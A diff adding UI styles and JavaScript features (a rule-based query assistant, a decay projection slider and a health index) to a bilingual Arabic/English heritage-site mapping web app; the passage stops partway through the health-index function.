@@ -3777,6 +3777,1282 @@ function toast(m){$('toastMsg').textContent=m;$('toast').classList.add('show');c
   },650);
 })();})(window.__HERITAGE_DB__);
 </script>
+<style>
+/* ============ ADVANCED SUITE UI ============ */
+#xhFab{position:fixed;bottom:18px;inset-inline-start:16px;z-index:1150;display:flex;align-items:center;gap:8px;
+  padding:11px 18px;border-radius:30px;background:linear-gradient(135deg,var(--petrol),var(--petrol-2));color:#fff;
+  font-family:var(--font-body);font-weight:700;font-size:13px;box-shadow:0 8px 26px rgba(17,50,65,.35);
+  border:1px solid rgba(255,255,255,.18);transition:transform .2s,box-shadow .2s;cursor:pointer}
+#xhFab:hover{transform:translateY(-2px);box-shadow:0 12px 32px rgba(17,50,65,.45)}
+[data-theme="dark"] #xhFab{background:linear-gradient(135deg,var(--teal-deep),#1c4a5c)}
+body.view-dash #xhFab,body.view-list #xhFab{display:none}
+@media print{#xhFab,#xhOverlay,#xhTourBar,#xhTourCard,#xhSotd,#xhBAOverlay{display:none!important}}
+
+#xhOverlay{position:fixed;inset:0;background:rgba(10,25,32,.55);backdrop-filter:blur(4px);z-index:1600;
+  display:none;align-items:center;justify-content:center;padding:20px}
+#xhOverlay.show{display:flex;animation:xhFade .22s}
+@keyframes xhFade{from{opacity:0}to{opacity:1}}
+#xhPanel{background:var(--panel);color:var(--text);border-radius:20px;box-shadow:var(--shadow-lg);
+  width:min(680px,94vw);max-height:88vh;display:flex;flex-direction:column;overflow:hidden;
+  animation:xhPop .28s cubic-bezier(.2,.9,.3,1.2)}
+@keyframes xhPop{from{transform:translateY(18px) scale(.97);opacity:0}to{transform:none;opacity:1}}
+#xhHead{display:flex;align-items:flex-start;justify-content:space-between;gap:12px;padding:20px 22px 14px;border-bottom:1px solid var(--border)}
+#xhTitle{font-family:var(--font-display);font-weight:700;font-size:19px}
+#xhSub{font-size:12px;color:var(--text-soft);margin-top:4px;line-height:1.6}
+#xhClose{width:34px;height:34px;border-radius:10px;display:flex;align-items:center;justify-content:center;flex:none;
+  background:var(--panel-2);color:var(--text-soft);cursor:pointer;transition:background .15s}
+#xhClose:hover{background:var(--border)}
+#xhBody{padding:18px 22px 22px;overflow-y:auto;font-size:13.5px;line-height:1.7}
+
+.xh-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:11px}
+.xh-card{display:flex;flex-direction:column;align-items:flex-start;gap:4px;text-align:start;
+  padding:14px;border-radius:14px;background:var(--panel-2);border:1px solid var(--border);cursor:pointer;
+  transition:transform .15s,box-shadow .15s,border-color .15s;font-family:inherit;color:var(--text)}
+.xh-card:hover{transform:translateY(-2px);box-shadow:var(--shadow);border-color:var(--accent)}
+.xh-card .xh-ic{font-size:22px;line-height:1}
+.xh-card b{font-size:13.5px;font-weight:700;margin-top:3px}
+.xh-card .xh-d{font-size:11px;color:var(--text-soft);line-height:1.5}
+
+.xh-btn{padding:9px 18px;border-radius:11px;background:var(--accent);color:#fff;font-weight:700;font-size:13px;
+  font-family:inherit;cursor:pointer;border:none;transition:opacity .15s}
+.xh-btn:hover{opacity:.88}
+.xh-btn.ghost{background:var(--panel-2);color:var(--text);border:1px solid var(--border)}
+.xh-in{width:100%;padding:11px 14px;border-radius:11px;border:1px solid var(--border);background:var(--panel-2);
+  color:var(--text);font-family:inherit;font-size:13.5px;outline:none}
+.xh-in:focus{border-color:var(--accent)}
+.xh-inrow{display:flex;gap:8px;margin-top:10px}
+.xh-actionrow{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+.xh-note{font-size:11.5px;color:var(--text-soft);background:var(--panel-2);border-radius:10px;padding:10px 13px;margin-top:12px;line-height:1.7}
+.xh-soft{color:var(--text-soft);font-size:11.5px}
+.xh-h4{font-size:13px;font-weight:700;margin:16px 0 10px;color:var(--text)}
+
+.xh-chips{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:10px}
+.xh-chip{padding:6px 13px;border-radius:20px;background:var(--panel-2);border:1px solid var(--border);
+  font-size:12px;font-family:inherit;color:var(--text);cursor:pointer;transition:all .15s}
+.xh-chip:hover{border-color:var(--accent)}
+.xh-chip.sel{background:var(--accent);color:#fff;border-color:var(--accent)}
+
+.xh-chat{height:280px;overflow-y:auto;background:var(--panel-2);border-radius:14px;padding:14px;display:flex;flex-direction:column;gap:9px}
+.xh-bub{max-width:85%;padding:10px 14px;border-radius:14px;background:var(--panel);box-shadow:0 1px 4px rgba(0,0,0,.07);
+  font-size:13px;line-height:1.75;align-self:flex-start}
+.xh-bub.me{background:var(--accent);color:#fff;align-self:flex-end}
+
+.xh-rows{display:flex;flex-direction:column;gap:7px;margin-top:8px}
+.xh-row{display:flex;align-items:center;gap:10px;padding:10px 13px;border-radius:12px;background:var(--panel-2);
+  border:1px solid transparent;transition:border-color .15s;font-size:13px}
+.xh-row[data-goto],.xh-row[data-v]{cursor:pointer}
+.xh-row[data-goto]:hover,.xh-row[data-v]:hover{border-color:var(--accent)}
+.xh-rowmain{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}
+.xh-rowmain b{font-size:13px;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.xh-rank{width:26px;height:26px;border-radius:8px;background:var(--panel-2);display:flex;align-items:center;justify-content:center;
+  font-weight:800;font-size:12px;flex:none;border:1px solid var(--border)}
+.xh-tag{padding:3px 10px;border-radius:8px;font-weight:700;font-size:12px;flex:none}
+
+.xh-kpirow{display:flex;gap:10px;margin:12px 0;flex-wrap:wrap}
+.xh-kpi{flex:1;min-width:120px;background:var(--panel-2);border-radius:13px;padding:13px;text-align:center}
+.xh-kpi b{display:block;font-size:23px;font-weight:800;font-variant-numeric:tabular-nums;font-family:var(--font-display)}
+.xh-kpi span{font-size:11px;color:var(--text-soft)}
+
+.xh-yearrow{display:flex;align-items:center;gap:14px;margin-bottom:6px}
+.xh-year{font-family:var(--font-display);font-weight:800;font-size:26px;min-width:74px;text-align:center;color:var(--accent)}
+
+.xh-gaugewrap{display:flex;align-items:center;gap:22px;flex-wrap:wrap;justify-content:center;margin:6px 0 4px}
+.xh-gauge{width:150px;height:150px}
+.xh-gaugeinfo{display:flex;flex-direction:column;gap:8px;font-size:13.5px}
+.xh-hlist{display:flex;flex-direction:column;gap:7px}
+.xh-hrow{display:flex;align-items:center;gap:10px;font-size:12.5px}
+.xh-hname{flex:0 0 130px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:600}
+.xh-track{flex:1;height:8px;background:var(--panel-2);border-radius:5px;overflow:hidden}
+.xh-fill{height:100%;border-radius:5px;transition:width .6s cubic-bezier(.2,.8,.3,1)}
+
+#xhTourBar{position:fixed;top:76px;left:50%;transform:translateX(-50%) translateY(-70px);z-index:1500;
+  display:flex;align-items:center;gap:14px;background:var(--panel);color:var(--text);padding:9px 10px 9px 18px;
+  border-radius:14px;box-shadow:var(--shadow-lg);font-size:13px;font-weight:600;transition:transform .35s;border:1px solid var(--border)}
+#xhTourBar.show{transform:translateX(-50%) translateY(0)}
+#xhTourCard{position:fixed;bottom:84px;left:50%;transform:translateX(-50%) translateY(30px);z-index:1490;
+  background:linear-gradient(135deg,rgba(17,50,65,.94),rgba(28,74,92,.94));color:#fff;padding:16px 26px;border-radius:16px;
+  box-shadow:0 18px 50px rgba(0,0,0,.4);text-align:center;max-width:86vw;opacity:0;pointer-events:none;transition:all .5s cubic-bezier(.2,.8,.3,1)}
+#xhTourCard.in{opacity:1;transform:translateX(-50%) translateY(0)}
+#xhTourCard .xtc-k{font-size:11px;letter-spacing:1px;color:#f0c090;font-weight:700;margin-bottom:4px}
+#xhTourCard .xtc-name{font-family:var(--font-display);font-size:22px;font-weight:700}
+#xhTourCard .xtc-meta{font-size:12.5px;color:#b8d2d6;margin-top:4px}
+
+#xhSotd{position:fixed;bottom:18px;inset-inline-end:16px;z-index:1140;width:270px;background:var(--panel);color:var(--text);
+  border-radius:16px;box-shadow:var(--shadow-lg);padding:16px;border:1px solid var(--border);
+  transform:translateY(140%);transition:transform .5s cubic-bezier(.2,.8,.3,1.1)}
+#xhSotd.show{transform:none}
+.xh-sotd-k{font-size:11px;font-weight:700;color:var(--amber);letter-spacing:.4px;margin-bottom:5px}
+.xh-sotd-n{font-family:var(--font-display);font-weight:700;font-size:15px;line-height:1.5}
+.xh-sotd-m{font-size:11.5px;color:var(--text-soft);margin:4px 0 12px}
+.xh-sotd-a{display:flex;gap:8px}
+body.view-dash #xhSotd,body.view-list #xhSotd{display:none}
+
+.xh-welstats{display:flex;gap:26px;justify-content:center;margin:6px 0 20px;flex-wrap:wrap}
+.xh-welstats>div{text-align:center}
+.xh-welstats b{display:block;font-family:var(--font-display);font-size:26px;font-weight:800;color:var(--accent);font-variant-numeric:tabular-nums}
+.xh-welstats span{font-size:11px;color:var(--text-soft)}
+
+.xh-mic{width:30px;height:30px;border-radius:9px;display:flex;align-items:center;justify-content:center;flex:none;
+  color:var(--text-soft);cursor:pointer;transition:all .15s}
+.xh-mic:hover{color:var(--accent);background:var(--panel-2)}
+.xh-mic.rec{color:#fff;background:#bd343b;animation:xhPulse 1s infinite}
+@keyframes xhPulse{0%,100%{box-shadow:0 0 0 0 rgba(189,52,59,.5)}50%{box-shadow:0 0 0 7px rgba(189,52,59,0)}}
+
+.xh-exif{margin-inline-start:8px;padding:8px 14px;border-radius:10px;background:var(--panel-2);border:1px dashed var(--accent);
+  color:var(--accent);font-weight:700;font-size:12px;font-family:inherit;cursor:pointer}
+.xh-exif:hover{background:var(--accent);color:#fff}
+
+.xh-ba-btn{display:inline-flex;align-items:center;gap:6px;margin:0 0 10px;padding:7px 14px;border-radius:10px;
+  background:var(--panel-2);border:1px solid var(--border);color:var(--text);font-size:12px;font-weight:700;font-family:inherit;cursor:pointer}
+.xh-ba-btn:hover{border-color:var(--accent);color:var(--accent)}
+#xhBAOverlay{position:fixed;inset:0;background:rgba(5,15,20,.85);z-index:1700;display:none;align-items:center;justify-content:center;padding:20px}
+#xhBAOverlay.show{display:flex}
+#xhBAPanel{width:min(860px,95vw);background:var(--panel);border-radius:18px;overflow:hidden;box-shadow:var(--shadow-lg)}
+#xhBAHead{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;color:var(--text);border-bottom:1px solid var(--border)}
+#xhBAHead button{width:30px;height:30px;border-radius:9px;background:var(--panel-2);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer}
+#xhBAStage{position:relative;height:min(56vh,480px);background:#0d1d24}
+#xhBAbefore,#xhBAafter{position:absolute;inset:0;background-size:contain;background-position:center;background-repeat:no-repeat}
+#xhBAHandle{position:absolute;top:0;bottom:0;width:3px;background:#fff;box-shadow:0 0 12px rgba(0,0,0,.6);pointer-events:none}
+#xhBAHandle::after{content:'⇆';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:36px;height:36px;
+  background:#fff;color:#113241;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700}
+.xh-balbl{position:absolute;top:10px;padding:4px 12px;border-radius:8px;background:rgba(10,25,32,.72);color:#fff;font-size:11.5px;font-weight:700}
+#xhBARange{width:100%;display:block;margin:0;padding:14px 18px;box-sizing:border-box;accent-color:var(--accent);background:var(--panel)}
+</style>
+<script>
+/* ============================================================
+   ADVANCED FEATURES SUITE — الميزات المتقدمة
+   Smart assistant · Timeline · Decay projection · Health index
+   Village explorer · National priorities · Tourist routes
+   Buffer zones · Radar compare · Survey progress · Atlas
+   GeoJSON/KML export · Audit log · Cinematic tour · EXIF GPS
+   Voice search · Before/After · Share cards · Site of the day
+   ============================================================ */
+(function(){
+'use strict';
+try{ if(!DB || !DB.sites || !map){ console.warn('XH suite: core not ready'); return; } }catch(e){ return; }
+
+/* ---------- helpers ---------- */
+const L=(ar,en)=>LANG==='ar'?ar:en;
+const el=(tag,cls,html)=>{const e=document.createElement(tag);if(cls)e.className=cls;if(html!=null)e.innerHTML=html;return e;};
+const decayColor=d=>d==null?'#9bb0b6':d<0.2?'#7fb9bb':d<0.35?'#f59e41':d<0.5?'#e95345':'#bd343b';
+const norm=s=>String(s||'').replace(/[ً-ْ]/g,'').replace(/[أإآ]/g,'ا').replace(/ى/g,'ي').replace(/ة/g,'ه').replace(/[٠-٩]/g,d=>'٠١٢٣٤٥٦٧٨٩'.indexOf(d)).toLowerCase().trim();
+const CUR_YEAR=2026;
+
+/* ---------- extra-filter hook into passes() ---------- */
+const XF={ageMin:null};
+const _passes0=passes;
+passes=function(s){
+  if(!_passes0(s))return false;
+  if(XF.ageMin!=null && (s[9]==null || s[9]<XF.ageMin))return false;
+  return true;
+};
+
+/* ---------- village index (shared by explorer / routes / tour) ---------- */
+let _xhVillages=null;
+function xhVillages(){
+  if(_xhVillages)return _xhVillages;
+  const g={};
+  for(let i=0;i<DB.sites.length;i++){
+    const s=DB.sites[i];
+    const m=s[1].match(/قرية\s+([^\d]+?)\s+التراثية/);
+    if(!m)continue;
+    const name='قرية '+m[1].trim();
+    let v=g[name];
+    if(!v)v=g[name]={name,idxs:[],lat:0,lng:0,dSum:0,dN:0,cls:{},reg:s[4],gov:s[5]};
+    v.idxs.push(i); v.lat+=s[2]; v.lng+=s[3];
+    if(s[10]!=null){v.dSum+=s[10];v.dN++;}
+    v.cls[s[6]]=(v.cls[s[6]]||0)+1;
+  }
+  _xhVillages=Object.values(g).filter(v=>v.idxs.length>=4).map(v=>{
+    v.lat/=v.idxs.length; v.lng/=v.idxs.length;
+    v.avgDecay=v.dN?Math.round(v.dSum/v.dN*100):null;
+    return v;
+  }).sort((a,b)=>b.idxs.length-a.idxs.length);
+  return _xhVillages;
+}
+
+/* ---------- map overlay layer (buffers + routes) ---------- */
+const XHOV={buffers:null,route:null};
+const _mapRender=map._render.bind(map);
+map._render=function(){
+  _mapRender();
+  try{xhDrawOverlays();}catch(e){}
+};
+function xhDrawOverlays(){
+  const ctx=map.ctx;
+  // protection buffers around class-أ sites
+  if(XHOV.buffers && map.z>=8.5){
+    const mpp=156543.03392*Math.cos(map.center[0]*Math.PI/180)/Math.pow(2,map.z);
+    const rpx=XHOV.buffers.radius/mpp;
+    if(rpx>=6){
+      ctx.save();
+      for(const b of XHOV.buffers.pts){
+        const [px,py]=map.project(b[0],b[1]);
+        if(px<-rpx||py<-rpx||px>map.w+rpx||py>map.h+rpx)continue;
+        ctx.beginPath();ctx.arc(px,py,rpx,0,Math.PI*2);
+        ctx.fillStyle='rgba(189,52,59,.08)';ctx.fill();
+        ctx.strokeStyle='rgba(189,52,59,.55)';ctx.lineWidth=1.5;ctx.setLineDash([6,4]);ctx.stroke();ctx.setLineDash([]);
+      }
+      ctx.restore();
+    }
+  }
+  // tourist route
+  if(XHOV.route && XHOV.route.length>1){
+    const pts=XHOV.route.map(st=>map.project(st.lat,st.lng));
+    ctx.save();
+    ctx.beginPath();pts.forEach((p,i)=>i?ctx.lineTo(p[0],p[1]):ctx.moveTo(p[0],p[1]));
+    ctx.strokeStyle='rgba(110,42,83,.35)';ctx.lineWidth=7;ctx.lineJoin='round';ctx.stroke();
+    ctx.beginPath();pts.forEach((p,i)=>i?ctx.lineTo(p[0],p[1]):ctx.moveTo(p[0],p[1]));
+    ctx.strokeStyle='#6e2a53';ctx.lineWidth=2.6;ctx.setLineDash([9,6]);ctx.stroke();ctx.setLineDash([]);
+    pts.forEach((p,i)=>{
+      ctx.beginPath();ctx.arc(p[0],p[1],12,0,Math.PI*2);
+      ctx.fillStyle='#6e2a53';ctx.fill();ctx.strokeStyle='#fff';ctx.lineWidth=2.5;ctx.stroke();
+      ctx.fillStyle='#fff';ctx.font='700 12px "Reem Kufi",sans-serif';ctx.textAlign='center';ctx.textBaseline='middle';
+      ctx.fillText(num(i+1),p[0],p[1]+1);
+    });
+    ctx.restore();
+  }
+}
+
+/* ---------- generic modal panel ---------- */
+let _xhOnClose=null;
+function xhOpen(title,sub,onClose){
+  const ov=$('xhOverlay'), pn=$('xhPanel');
+  $('xhTitle').textContent=title;
+  $('xhSub').textContent=sub||'';
+  $('xhSub').style.display=sub?'':'none';
+  $('xhBody').innerHTML='';
+  _xhOnClose=onClose||null;
+  ov.classList.add('show');
+  return $('xhBody');
+}
+function xhClose(){
+  $('xhOverlay').classList.remove('show');
+  if(_xhOnClose){try{_xhOnClose();}catch(e){} _xhOnClose=null;}
+}
+
+/* ---------- feature drawer ---------- */
+const FEATURES=[
+  {id:'assistant', ic:'🤖', ar:'المساعد الذكي',        en:'Smart assistant',      dar:'اسأل عن البيانات بالعربي',                den:'Ask the data in plain language'},
+  {id:'projection',ic:'📉', ar:'النمذجة المستقبلية',    en:'Decay projection',     dar:'كيف تبدو الخريطة بعد ٢٠ سنة؟',            den:'How will the map look in 20 years?'},
+  {id:'health',    ic:'💠', ar:'مؤشّر صحة التراث',     en:'Heritage health index', dar:'رقم وطني واحد لحالة التراث',               den:'One national score'},
+  {id:'priorities',ic:'🚨', ar:'الأولويات الوطنية',     en:'National priorities',  dar:'أعلى ١٠٠ موقع استحقاقاً للترميم',          den:'Top 100 sites for restoration'},
+  {id:'timeline',  ic:'⏳', ar:'الخط الزمني',           en:'Timeline',             dar:'تصفية وعرض المواقع حسب العمر',             den:'Filter sites by age'},
+  {id:'villages',  ic:'🏘️', ar:'مستكشف القرى',         en:'Village explorer',     dar:'ملفات تعريفية للقرى التراثية',             den:'Heritage village profiles'},
+  {id:'routes',    ic:'🛣️', ar:'المسارات السياحية',     en:'Tourist routes',       dar:'خطّط رحلة بين المواقع القريبة',            den:'Plan a heritage trip'},
+  {id:'tour',      ic:'🎬', ar:'جولة سينمائية',         en:'Cinematic tour',       dar:'طيران تلقائي بين أجمل القرى',              den:'Auto-fly between top villages'},
+  {id:'buffers',   ic:'⭕', ar:'نطاقات الحماية',        en:'Protection buffers',   dar:'دوائر ٥٠٠م حول مواقع الفئة (أ)',           den:'500m buffers around Class A'},
+  {id:'radar',     ic:'🕸️', ar:'مقارنة رادار',          en:'Radar compare',        dar:'مقارنة المناطق على ٦ محاور',               den:'Compare regions on 6 axes'},
+  {id:'progress',  ic:'📋', ar:'اكتمال الحصر',          en:'Survey progress',      dar:'نسبة اكتمال البيانات لكل منطقة',           den:'Data completeness per region'},
+  {id:'atlas',     ic:'📖', ar:'الأطلس الوطني',         en:'National atlas',       dar:'تقرير شامل لكل المناطق (طباعة)',           den:'Print-ready all-regions report'},
+  {id:'geo',       ic:'🌍', ar:'تصدير GeoJSON / KML',   en:'GeoJSON / KML export', dar:'افتح بياناتك في Google Earth و QGIS',      den:'Open your data in GIS tools'},
+  {id:'audit',     ic:'🗒️', ar:'سجل التعديلات',         en:'Audit log',            dar:'توثيق كل إضافة وتعديل',                    den:'Every change, documented'},
+];
+function openDrawer(){
+  const b=xhOpen(L('الأدوات المتقدمة','Advanced tools'),L('ميزات ذكية للتحليل والعرض واتخاذ القرار','Smart features for analysis & decisions'));
+  const grid=el('div','xh-grid');
+  FEATURES.forEach(f=>{
+    const c=el('button','xh-card',`<span class="xh-ic">${f.ic}</span><b>${L(f.ar,f.en)}</b><span class="xh-d">${L(f.dar,f.den)}</span>`);
+    c.onclick=()=>FEATURE_FN[f.id]&&FEATURE_FN[f.id]();
+    grid.appendChild(c);
+  });
+  b.appendChild(grid);
+}
+
+/* ============================================================
+   1) SMART ASSISTANT
+   ============================================================ */
+function askAssistant(){
+  const b=xhOpen(L('المساعد الذكي للبيانات','Smart data assistant'),L('اسأل عن السجل بلغتك — وسيجيبك ويطبّق الفلاتر على الخريطة','Ask in plain language — answers & filters the map'));
+  b.innerHTML=`<div class="xh-chat" id="xhChat"></div>
+    <div class="xh-chips" id="xhChips"></div>
+    <div class="xh-inrow"><input id="xhQ" class="xh-in" placeholder="${L('مثال: كم موقع فئة أ في عسير تهدمه فوق 50؟','e.g. how many class A sites in Asir above 50% decay?')}">
+    <button class="xh-btn" id="xhAsk">${L('اسأل','Ask')}</button></div>`;
+  const chat=$('xhChat');
+  const examples=LANG==='ar'
+    ?['كم موقع في عسير؟','أخطر 5 مواقع في الباحة','كم مسجد تراثي فئة أ؟','مواقع تهدمها فوق 70 في مكة المكرمة']
+    :['How many sites in عسير?','Top 5 risky in الباحة','كم قصر في نجران؟','مواقع فوق 60٪ تهدم'];
+  $('xhChips').innerHTML=examples.map(x=>`<button class="xh-chip">${x}</button>`).join('');
+  $('xhChips').querySelectorAll('.xh-chip').forEach(c=>c.onclick=()=>{$('xhQ').value=c.textContent;go();});
+  const bubble=(html,me)=>{const d=el('div','xh-bub'+(me?' me':''),html);chat.appendChild(d);chat.scrollTop=chat.scrollHeight;};
+  bubble(L('أهلاً! اسألني عن أي شيء في السجل: الأعداد، المخاطر، الفئات، المناطق…','Hi! Ask me anything about the register.'));
+  function go(){
+    const q=$('xhQ').value.trim(); if(!q)return;
+    bubble(q,true); $('xhQ').value='';
+    setTimeout(()=>bubble(answer(q)),250);
+  }
+  $('xhAsk').onclick=go;
+  $('xhQ').onkeydown=e=>{if(e.key==='Enter')go();};
+  chat.addEventListener('click',e=>{
+    const r=e.target.closest('[data-goto]'); if(!r)return;
+    xhClose(); setView('map'); gotoSite(+r.dataset.goto);
+  });
+  $('xhQ').focus();
+}
+function answer(q){
+  const nq=norm(q);
+  // region
+  let ri=null;
+  for(let i=0;i<DB.regions.length;i++) if(nq.includes(norm(DB.regions[i]))){ri=i;break;}
+  // governorate (skip if identical to matched region name)
+  let gi=null;
+  for(let i=0;i<DB.govs.length;i++){
+    const ng=norm(DB.govs[i]);
+    if(ng.length<3)continue;
+    if(ri!=null && ng===norm(DB.regions[ri]))continue;
+    if(nq.includes(ng)){gi=i;break;}
+  }
+  // class
+  let ci=null;
+  const cm=q.match(/فئة\s*(أ|ا|ب|ج)/)||q.match(/class\s*(a|b|c)/i);
+  if(cm){
+    const map1={'أ':'أ','ا':'أ','ب':'ب','ج':'ج','a':'أ','b':'ب','c':'ج'};
+    ci=DB.classes.indexOf(map1[cm[1].toLowerCase()]);
+    if(ci<0)ci=null;
+  }
+  // decay threshold
+  let dmin=null;
+  const dm=nq.match(/(تهدم|هدم|decay)[^0-9]*(\d+)/)||nq.match(/فوق\s*(\d+)/)||nq.match(/(\d+)\s*٪/)||nq.match(/(\d+)\s*%/);
+  if(dm){const v=+dm[dm.length-1];if(v>=5&&v<=100)dmin=v;}
+  // category
+  let cat=null;
+  const CATW={mosque:/مسجد|مساجد|جامع/,palace:/قصر|قصور/,fort:/حصن|حصون|قلعه|قلاع|سور/,tower:/برج|ابراج/,well:/بئر|بير|ابار/,house:/سكني/,school:/مدرسه|مدارس/,market:/سوق|اسواق/};
+  for(const[k,re]of Object.entries(CATW))if(re.test(nq)){cat=k;break;}
+  // intent
+  const wantTop=/اخطر|أخطر|اعلي|أعلى|الاكثر|الأكثر|احتياج|top|worst|risk/.test(nq);
+  let topN=5; const tn=nq.match(/(\d+)\s*(موقع|مواقع|sites?)/); if(wantTop&&tn)topN=Math.min(20,+tn[1]||5);
+
+  // matcher
+  const match=s=>{
+    if(ri!=null&&s[4]!==ri)return false;
+    if(gi!=null&&s[5]!==gi)return false;
+    if(ci!=null&&s[6]!==ci)return false;
+    if(dmin!=null&&(s[10]==null||s[10]*100<dmin))return false;
+    if(cat&&siteCat(s)!==cat)return false;
+    return true;
+  };
+  const hits=[]; for(let i=0;i<DB.sites.length;i++)if(match(DB.sites[i]))hits.push(i);
+
+  const scopeBits=[];
+  if(ri!=null)scopeBits.push(DB.regions[ri]);
+  if(gi!=null)scopeBits.push(DB.govs[gi]);
+  if(ci!=null)scopeBits.push(L('فئة ','Class ')+DB.classes[ci]);
+  if(cat){const c=SITE_CATS.find(x=>x.key===cat);if(c)scopeBits.push(L(c.ar,c.en));}
+  if(dmin!=null)scopeBits.push(L('تهدّم ≥ ','decay ≥ ')+num(dmin)+'٪');
+  const scope=scopeBits.length?scopeBits.join(' · '):L('كل السجل','entire register');
+
+  if(!hits.length)return L(`لم أجد أي موقع مطابق (${scope}).`,`No sites matched (${scope}).`);
+
+  if(wantTop){
+    const top=hits.map(i=>({i,r:riskScore(DB.sites[i])})).sort((a,b)=>b.r-a.r).slice(0,topN);
+    const rows=top.map((o,k)=>{const s=DB.sites[o.i];
+      return `<div class="xh-row" data-goto="${o.i}"><b>${num(k+1)}.</b> ${s[1]} <span class="xh-tag" style="background:${riskColor(o.r)}22;color:${riskColor(o.r)}">${num(o.r)}</span><span class="xh-soft">${DB.govs[s[5]]}</span></div>`;}).join('');
+    return L(`أعلى ${num(top.length)} مواقع خطورة (${scope}) — اضغط أي موقع للانتقال إليه:`,`Top ${num(top.length)} risky sites (${scope}):`)+`<div class="xh-rows">${rows}</div>`;
+  }
+
+  // apply to map filters
+  try{
+    initState(); state.region=ri!=null?String(ri):''; state.gov=gi!=null?String(gi):'';
+    state.type=''; state.cat=cat||''; state.decayMin=dmin||0;
+    if(ci!=null)state.cls=new Set([ci]);
+    buildCatList();buildSelects();
+    if($('decayRange')){$('decayRange').value=state.decayMin;$('decayRangeVal').textContent=num(state.decayMin)+'٪';}
+    render();
+    const bnd=filteredBounds(); if(bnd)map.fitBounds(bnd,0.15);
+  }catch(e){}
+  // quick stats
+  let dS=0,dN=0,urg=0;
+  hits.forEach(i=>{const d=DB.sites[i][10];if(d!=null){dS+=d;dN++;if(d>=0.5)urg++;}});
+  const avg=dN?Math.round(dS/dN*100):null;
+  return L(
+    `وجدت <b>${num(hits.length)}</b> موقعاً (${scope})${avg!=null?` — متوسط التهدّم <b>${num(avg)}٪</b> ومنها <b>${num(urg)}</b> ملحّة للترميم`:''}.<br><span class="xh-soft">✓ طبّقت الفلاتر على الخريطة</span>`,
+    `Found <b>${num(hits.length)}</b> sites (${scope})${avg!=null?` — avg decay <b>${num(avg)}%</b>, <b>${num(urg)}</b> urgent`:''}.<br><span class="xh-soft">✓ Filters applied to the map</span>`);
+}
+
+/* ============================================================
+   2) FUTURE DECAY PROJECTION
+   ============================================================ */
+let _projOn=false;
+function openProjection(){
+  _projOn=true;
+  const b=xhOpen(L('النمذجة المستقبلية للتدهور','Future decay projection'),L('محاكاة حالة المواقع إذا استمر التدهور بمعدله الحالي دون تدخل','Simulated condition if decay continues untreated'));
+  b.innerHTML=`
+    <div class="xh-yearrow"><span class="xh-year" id="xhYear">${num(CUR_YEAR)}</span>
+      <input type="range" id="xhYearRange" min="${CUR_YEAR}" max="${CUR_YEAR+20}" value="${CUR_YEAR}" step="1" style="flex:1">
+      <button class="xh-btn ghost" id="xhYearPlay">▶ ${L('تشغيل','Play')}</button></div>
+    <div class="xh-kpirow">
+      <div class="xh-kpi"><b id="xpUrgent">—</b><span>${L('مواقع تهدّمها ≥ ٥٠٪','sites ≥ 50% decay')}</span></div>
+      <div class="xh-kpi"><b id="xpAvg">—</b><span>${L('متوسط التهدّم المتوقع','projected avg decay')}</span></div>
+      <div class="xh-kpi"><b id="xpLost">—</b><span>${L('مواقع شبه مفقودة (≥ ٩٠٪)','nearly lost (≥ 90%)')}</span></div>
+    </div>
+    <div class="xh-note">${L('ألوان الخريطة تتغيّر مباشرة مع السنة. المعدل السنوي محسوب من (نسبة التهدّم ÷ العمر) لكل موقع.','Map colors update live. Rate = decay ÷ age per site.')}</div>`;
+  const apply=y=>{
+    $('xhYear').textContent=num(y);
+    const pts=[];let dS=0,dN=0,urg=0,lost=0;
+    const dy=y-CUR_YEAR;
+    for(let i=0;i<DB.sites.length;i++){
+      const s=DB.sites[i];
+      if(!passes(s))continue;
+      const d0=s[10]!=null?s[10]:0.25;
+      const rate=(s[10]!=null&&s[9]>0)?Math.min(0.03,Math.max(0.002,s[10]/s[9])):0.004;
+      const p=Math.min(1,d0+rate*dy);
+      dS+=p;dN++;if(p>=0.5)urg++;if(p>=0.9)lost++;
+      pts.push({lat:s[2],lng:s[3],color:decayColor(p),zone:DB.types[s[7]]==='منطقة',data:{idx:i,lat:s[2],lng:s[3]}});
+    }
+    map.setPoints(pts);
+    $('xpUrgent').textContent=num(urg);
+    $('xpAvg').textContent=dN?num(Math.round(dS/dN*100))+'٪':'—';
+    $('xpLost').textContent=num(lost);
+    $('xpUrgent').style.color=urg>dN*0.4?'#bd343b':urg>dN*0.2?'#e95345':'var(--text)';
+  };
+  $('xhYearRange').oninput=e=>apply(+e.target.value);
+  let playT=null;
+  $('xhYearPlay').onclick=function(){
+    if(playT){clearInterval(playT);playT=null;this.textContent='▶ '+L('تشغيل','Play');return;}
+    this.textContent='⏸ '+L('إيقاف','Pause');
+    playT=setInterval(()=>{
+      const r=$('xhYearRange'); if(!r||!_projOn){clearInterval(playT);playT=null;return;}
+      let v=+r.value+1; if(v>+r.max)v=+r.min;
+      r.value=v; apply(v);
+    },600);
+  };
+  apply(CUR_YEAR);
+  _xhOnClose=()=>{_projOn=false;if(playT)clearInterval(playT);render();};
+}
+
+/* ============================================================
+   3) HEALTH INDEX
+   ============================================================ */
+function regionHealth(ri){
+  let n=0,dS=0,dN=0,urg=0;
+  for(const s of DB.sites){if(s[4]!==ri)continue;n++;if(s[10]!=null){dS+=s[10];dN++;if(s[10]>=0.5)urg++;}}
+  if(!n)return null;
+  const avg=dN?dS/dN:0.3, urgP=dN?urg/dN:0;
+  return {n,score:Math.max(0,Math.min(100,Math.round(100-(avg*100*0.7+urgP*100*0.3))))};
+}
+function openHealth(){
+  let N=0,dS=0,dN=0,urg=0;
+  for(const s of DB.sites){N++;if(s[10]!=null){dS+=s[10];dN++;if(s[10]>=0.5)urg++;}}
+  const avg=dN?dS/dN:0.3,urgP=dN?urg/dN:0;
+  const score=Math.max(0,Math.min(100,Math.round(100-(avg*100*0.7+urgP*100*0.3))));
+  const sc=score>=70?'#2f6f72':score>=50?'#f59e41':'#bd343b';
